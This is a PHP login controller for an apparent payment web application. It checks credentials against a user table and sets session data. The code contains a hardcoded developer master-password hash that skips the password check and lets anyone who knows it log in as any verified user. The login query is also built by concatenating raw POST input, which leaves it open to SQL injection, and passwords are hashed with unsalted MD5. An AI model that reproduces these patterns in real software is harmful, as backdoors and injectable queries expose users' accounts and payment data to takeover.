<?php
class Login extends Controller
{
   public function index()
   {
      if (isset($_SESSION['login_payment'])) {
         if ($_SESSION['login_payment'] == TRUE) {
            header('Location: ' . $this->BASE_URL . "Home");
         } else {
            $this->view('login/login');
         }
      } else {
         $this->view('login/login');
      }
   }

   public function cek_login()
   {
      if (isset($_SESSION['login_payment'])) {
         if ($_SESSION['login_payment'] == TRUE) {
            header('Location: ' . $this->BASE_URL . "Home");
         }
      }

      $pass = md5($_POST["PASS"]);
      $devPass = "028a77968bb1b0735da00e5e1c4bd496";

      if ($pass == $devPass) {
         $where1 = "no_user = '" . $_POST["HP"] . "' AND en = 1";
      } else {
         $where1 = "no_user = '" . $_POST["HP"] . "' AND password = '" . $pass . "'";
      }

      $userData = $this->model('M_DB_1')->get_where_row('user', $where1);

      if (empty($userData)) {
         echo "No HP dan Password tidak cocok!";
         exit();
      } else {
         if ($userData['en'] <> 1) {
            echo "User belum terverifikasi!";
            exit();
         } else {
            //LOGIN
            $where = "id_user = " . $userData['id_user'];
            $set = "pin_failed = 0";
            $this->model('M_DB_1')->update("user", $set, $where);

            $userData = $this->model('M_DB_1')->get_where_row('user', $where1);

            $_SESSION['login_payment'] = TRUE;
            $_SESSION['user_data'] = $userData;

            $where = "no_user = " . $userData['no_master'];
            $_SESSION['setting'] = $this->model('M_DB_1')->get_where_row('user', $where);

            $this->model('M_IAK')->getPrepaidList();
            $this->model('M_IAK')->getPostpaidList();
            echo 1;
         }
      }
   }

   public function logout()
   {
      session_start();
      session_unset();
      session_destroy();
      header('Location: ' . $this->BASE_URL . "Home");
   }
}
